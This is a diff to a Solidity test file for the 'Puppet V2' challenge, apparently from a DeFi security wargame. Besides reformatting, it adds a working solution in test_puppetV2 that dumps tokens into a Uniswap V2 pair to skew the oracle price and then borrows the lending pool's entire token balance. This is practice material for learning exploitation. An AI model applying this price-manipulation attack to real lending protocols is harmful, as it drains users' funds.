@@ -48,11 +48,14 @@ contract PuppetV2Challenge is Test {
 
         // Deploy Uniswap V2 Factory and Router
         uniswapV2Factory = IUniswapV2Factory(
-            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(0)))
+            deployCode(
+                string.concat("src/builds/uniswap/UniswapV2Factory.json"),
+                abi.encode(address(0))
+            )
         );
         uniswapV2Router = IUniswapV2Router02(
             deployCode(
-                string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Router02.json"),
+                string.concat("src/builds/uniswap/UniswapV2Router02.json"),
                 abi.encode(address(uniswapV2Factory), address(weth))
             )
         );
@@ -67,11 +70,17 @@ contract PuppetV2Challenge is Test {
             to: deployer,
             deadline: block.timestamp * 2
         });
-        uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));
+        uniswapV2Exchange = IUniswapV2Pair(
+            uniswapV2Factory.getPair(address(token), address(weth))
+        );
 
         // Deploy the lending pool
-        lendingPool =
-            new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));
+        lendingPool = new PuppetV2Pool(
+            address(weth),
+            address(token),
+            address(uniswapV2Exchange),
+            address(uniswapV2Factory)
+        );
 
         // Setup initial token balances of pool and player accounts
         token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
@@ -86,26 +95,71 @@ contract PuppetV2Challenge is Test {
     function test_assertInitialState() public view {
         assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
         assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
-        assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
+        assertEq(
+            token.balanceOf(address(lendingPool)),
+            POOL_INITIAL_TOKEN_BALANCE
+        );
         assertGt(uniswapV2Exchange.balanceOf(deployer), 0);
 
         // Check pool's been correctly setup
-        assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
-        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
+        assertEq(
+            lendingPool.calculateDepositOfWETHRequired(1 ether),
+            0.3 ether
+        );
+        assertEq(
+            lendingPool.calculateDepositOfWETHRequired(
+                POOL_INITIAL_TOKEN_BALANCE
+            ),
+            300000 ether
+        );
     }
 
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+        token.approve(address(uniswapV2Router), type(uint256).max);
+
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        uint256[] memory amounts = uniswapV2Router.getAmountsIn(
+            9.91 ether,
+            path
+        );
+        console.log("Amount of tokens needed to buy 10 WETH:", amounts[0]);
+
+        uniswapV2Router.swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            0,
+            path,
+            address(player),
+            block.timestamp * 2
+        );
+        weth.deposit{value: 9.9 ether}();
+
+        weth.approve(address(lendingPool), weth.balanceOf(player));
+
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
     function _isSolved() private view {
-        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
-        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(address(lendingPool)),
+            0,
+            "Lending pool still has tokens"
+        );
+        assertEq(
+            token.balanceOf(recovery),
+            POOL_INITIAL_TOKEN_BALANCE,
+            "Not enough tokens in recovery account"
+        );
     }
 }
